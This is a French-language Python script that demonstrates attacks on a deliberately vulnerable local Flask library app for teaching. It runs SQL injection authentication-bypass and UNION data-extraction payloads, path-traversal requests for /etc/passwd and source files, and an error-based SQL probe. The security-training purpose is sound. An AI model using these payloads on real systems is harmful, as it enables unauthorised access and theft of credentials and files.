#!/usr/bin/env python3
"""
Script de démonstration des vulnérabilités
À des fins éducatives uniquement
"""

import requests
import sys
from colorama import init, Fore, Style

init(autoreset=True)

BASE_URL = "http://localhost:5000"

def print_header(text):
    print(f"\n{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}{text}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")

def print_success(text):
    print(f"{Fore.GREEN}[✓] {text}{Style.RESET_ALL}")

def print_error(text):
    print(f"{Fore.RED}[✗] {text}{Style.RESET_ALL}")

def print_info(text):
    print(f"{Fore.YELLOW}[i] {text}{Style.RESET_ALL}")

def test_sql_injection_login():
    """Test d'injection SQL sur le login"""
    print_header("Test 1: Injection SQL - Bypass d'authentification")

    payloads = [
        ("admin' OR '1'='1", "anything"),
        ("admin'--", ""),
        ("' OR '1'='1'--", ""),
    ]

    for username, password in payloads:
        print_info(f"Test avec username: {username}")
        try:
            response = requests.post(
                f"{BASE_URL}/login",
                data={"username": username, "password": password},
                timeout=5
            )
            if "Bienvenue" in response.text or "admin" in response.text.lower():
                print_success("Injection SQL réussie! Authentification bypassée.")
                print(f"   Réponse: {response.text[:100]}...")
            else:
                print_error("Échec de l'injection SQL")
        except Exception as e:
            print_error(f"Erreur: {str(e)}")

def test_sql_injection_search():
    """Test d'injection SQL sur la recherche"""
    print_header("Test 2: Injection SQL - Extraction de données")

    payloads = [
        "' UNION SELECT username, password, role FROM users--",
        "' UNION SELECT sql, type, name FROM sqlite_master--",
    ]

    for payload in payloads:
        print_info(f"Test avec query: {payload}")
        try:
            response = requests.get(
                f"{BASE_URL}/search",
                params={"query": payload},
                timeout=5
            )
            if response.status_code == 200:
                if "Erreur" in response.text or "admin" in response.text:
                    print_success("Injection SQL possible sur la recherche")
                    print(f"   Réponse: {response.text[:200]}...")
                else:
                    print_info("Réponse reçue mais pas de données sensibles visibles")
            else:
                print_error(f"Échec: Status {response.status_code}")
        except Exception as e:
            print_error(f"Erreur: {str(e)}")

def test_path_traversal():
    """Test de Path Traversal"""
    print_header("Test 3: Path Traversal - Accès aux fichiers système")

    payloads = [
        "../app.py",
        "../../app.py",
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    ]

    for payload in payloads:
        print_info(f"Test avec file: {payload}")
        try:
            response = requests.get(
                f"{BASE_URL}/download",
                params={"file": payload},
                timeout=5
            )
            if response.status_code == 200 and len(response.content) > 0:
                content_preview = response.text[:100] if len(response.text) > 100 else response.text
                if "from flask" in content_preview or "import" in content_preview or "root:" in content_preview:
                    print_success(f"Path Traversal réussi! Fichier accessible.")
                    print(f"   Contenu (aperçu): {content_preview}...")
                else:
                    print_info(f"Fichier téléchargé (taille: {len(response.content)} bytes)")
            else:
                print_error(f"Fichier non accessible (Status: {response.status_code})")
        except Exception as e:
            print_error(f"Erreur: {str(e)}")

def test_information_disclosure():
    """Test de divulgation d'informations via les erreurs"""
    print_header("Test 4: Divulgation d'informations - Messages d'erreur")

    # Provoquer une erreur SQL
    print_info("Provocation d'une erreur SQL intentionnelle")
    try:
        response = requests.post(
            f"{BASE_URL}/login",
            data={"username": "test' AND 1=CAST('a' AS INTEGER)--", "password": "x"},
            timeout=5
        )
        if "sqlite" in response.text.lower() or "syntax" in response.text.lower():
            print_success("Divulgation d'informations SQL détectée")
            print(f"   Message d'erreur visible dans la réponse")
        else:
            print_info("Pas de message d'erreur SQL visible")
    except Exception as e:
        print_error(f"Erreur: {str(e)}")

def test_application_health():
    """Vérifier que l'application est accessible"""
    print_header("Test préliminaire: Vérification de l'application")

    try:
        response = requests.get(f"{BASE_URL}/health", timeout=5)
        if response.status_code == 200:
            print_success(f"Application accessible: {response.json()}")
            return True
        else:
            print_error(f"Application inaccessible (Status: {response.status_code})")
            return False
    except Exception as e:
        print_error(f"Impossible de contacter l'application: {str(e)}")
        print_info("Assurez-vous que l'application tourne sur http://localhost:5000")
        return False

def main():
    print(f"""
{Fore.RED}╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   Démo d'Exploitation - Bibliothèque Vulnérable          ║
║   À DES FINS ÉDUCATIVES UNIQUEMENT                       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝{Style.RESET_ALL}
""")

    print_info("Ce script démontre les vulnérabilités de l'application")
    print_info("Ne jamais utiliser sur des systèmes sans autorisation!\n")

    if not test_application_health():
        sys.exit(1)

    test_sql_injection_login()
    test_sql_injection_search()
    test_path_traversal()
    test_information_disclosure()

    print_header("Résumé")
    print_info("Les tests de vulnérabilités sont terminés")
    print_info("Consultez SECURITY.md pour les corrections")
    print_success("Utilisez app_secure.py pour la version sécurisée\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Interruption par l'utilisateur{Style.RESET_ALL}")
        sys.exit(0)
